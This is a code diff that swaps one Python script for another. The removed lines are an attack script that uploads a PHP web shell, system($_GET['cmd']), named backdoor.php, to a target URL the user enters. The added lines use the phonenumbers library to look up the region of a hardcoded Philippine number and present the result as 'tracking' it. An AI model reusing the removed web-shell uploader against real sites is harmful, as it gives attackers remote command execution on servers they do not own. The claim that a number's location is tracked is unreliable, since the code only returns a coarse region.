@@ -1,20 +1,15 @@
-import requests
+import phonenumbers
+from phonenumbers import geocoder
 
-def inject_backdoor(file_path, backdoor_code):
-    url = input("Target url: ")
-    
-    payload = "<?php " + backdoor_code + " ?>"
-    
-    files = {'file': (file_path, payload, 'text/php')}
-    
-    response = requests.post(url, files=files)
-    
-    if response.status_code == 200:
-        print("Backdoor injected successfully!")
-    else:
-        print("Injection failed.")
+def track_phone_number(phone_number):
+    try:
+        parsed_number = phonenumbers.parse(phone_number, "PH")
+        region = geocoder.description_for_number(parsed_number, "en")
+        return region
+    except phonenumbers.phonenumberutil.NumberParseException:
+        return "Invalid phone number"
 
-file_path = "backdoor.php"
-backdoor_code = "system($_GET['cmd']);"
+phone_number = "+639266659001"  
 
-inject_backdoor(file_path, backdoor_code)
+location = track_phone_number(phone_number)
+print(f"The location of {phone_number} is: {location}")
